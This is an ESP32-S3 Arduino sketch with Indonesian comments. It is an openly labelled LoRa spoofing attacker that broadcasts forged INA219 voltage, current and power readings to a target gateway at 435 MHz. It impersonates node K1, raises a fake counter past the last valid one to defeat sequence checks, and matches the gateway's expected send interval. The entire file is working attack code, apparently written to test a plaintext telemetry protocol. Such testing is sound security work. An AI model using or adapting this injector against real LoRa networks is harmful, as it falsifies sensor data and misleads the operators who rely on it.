#include <SPI.h>
#include <LoRa.h>

// Definisi PIN LoRa ESP32-S3 sesuai dengan target gateway
#define LORA_SCK   12
#define LORA_MISO  13
#define LORA_MOSI  11
#define LORA_SS    10
#define LORA_RST   5
#define LORA_DIO0  4

// Frekuensi disamakan dengan target gateway (435 MHz)
#define LORA_FREQ  435E6

// Variabel Counter awal (Set di atas nilai counter terakhir pada log valid kamu)
int fake_ctr = 250; 

void setup() {
  Serial.begin(115200);
  delay(1000);

  // Inisialisasi SPI dan Pin LoRa
  SPI.begin(LORA_SCK, LORA_MISO, LORA_MOSI, LORA_SS);
  LoRa.setPins(LORA_SS, LORA_RST, LORA_DIO0);

  if (!LoRa.begin(LORA_FREQ)) {
    Serial.println("LoRa gagal start");
    while (1);
  }

  // Parameter RF wajib identik agar gelombang lurus masuk ke antena target
  LoRa.setSpreadingFactor(7);
  LoRa.setSignalBandwidth(125E3);
  LoRa.setCodingRate4(5);
  LoRa.enableCrc();

  Serial.println("[ATTACKER] Spoofing Engine Active - Plaintext Injection Mode");
}

void loop() {
  // =================================================================
  // ALGORITMA MANIPULASI DATA SENSOR INA219 (Ubah sesuka hatimu)
  // =================================================================
  float fake_v = 4.850;   // Manipulasi tegangan ke 4.850 Volt
  float fake_i = 92.40;   // Manipulasi arus ke 92.40 mA
  float fake_p = fake_v * fake_i; // Daya otomatis terhitung (mW)

  // =================================================================
  // STRUKTUR STRING RE-CONSTRUCTION (Sesuai Syarat hasRequiredFields)
  // =================================================================
  // Format wajib: ver=X;node=X;ctr=X;ts=X;v=X;i=X;p=X;
  // Kita tambahkan rt (Realtime) opsional agar sinkronisasi waktu dashboard tidak melompat
  
  String spoofed_payload = "ver=1;"
                           "node=K1;"
                           "ctr=" + String(fake_ctr) + ";"
                           "ts=" + String(millis()) + ";"
                           "v=" + String(fake_v, 3) + ";"
                           "i=" + String(fake_i, 2) + ";"
                           "p=" + String(fake_p, 2) + ";";

  // Pancarkan Paket Spoofing ke udara
  Serial.print("[ATTACKER] Menyuntikkan Data Palsu: ");
  Serial.println(spoofed_payload);

  LoRa.beginPacket();
  LoRa.print(spoofed_payload);
  LoRa.endPacket();

  // Inkremasi counter agar lolos pengecekan urutan berkelanjutan
  fake_ctr++;

  // Interval pengiriman disesuaikan dengan EXPECTED_SEND_INTERVAL_SECONDS (4 detik)
  delay(4000); 
}